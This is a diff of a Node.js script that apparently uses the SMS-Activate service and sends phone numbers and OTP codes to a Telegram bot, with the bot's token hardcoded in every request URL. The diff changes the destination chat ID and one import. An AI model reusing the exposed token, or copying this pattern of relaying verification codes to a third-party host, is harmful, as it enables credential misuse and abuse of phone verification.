@@ -3,8 +3,8 @@ const moment = require('moment');
 const fetch = require('node-fetch');
 const SMSActivate = require('sms-activate');
 const { v4: uuidv4 } = require('uuid');
-const readline = require("readline-sync");
 const delay = require('delay');
+const { text } = require('cheerio/lib/api/manipulation');
 
 async function ip() {
     let fet = await fetch("https://httpbin.org/ip", {
@@ -46,7 +46,7 @@ const genUniqueId = length =>
     });
 
 const functionsendNumber = (phoneNumber) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=5020446022&text=${phoneNumber}`, {
+    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${phoneNumber}`, {
     method: 'POST',
 })
     .then(res => res.json())
@@ -57,7 +57,7 @@ const functionsendNumber = (phoneNumber) => new Promise((resolve, reject) => {
 });
 
 const functionsendOtp1 = (text1) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=5020446022&text=${text1}`, {
+    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${text1}`, {
     method: 'POST',
 })
     .then(res => res.json())
@@ -68,7 +68,7 @@ const functionsendOtp1 = (text1) => new Promise((resolve, reject) => {
 });
 
 const functionsendOtp2 = (text2) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=5020446022&text=${text2}`, {
+    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${text2}`, {
     method: 'POST',
 })
     .then(res => res.json())
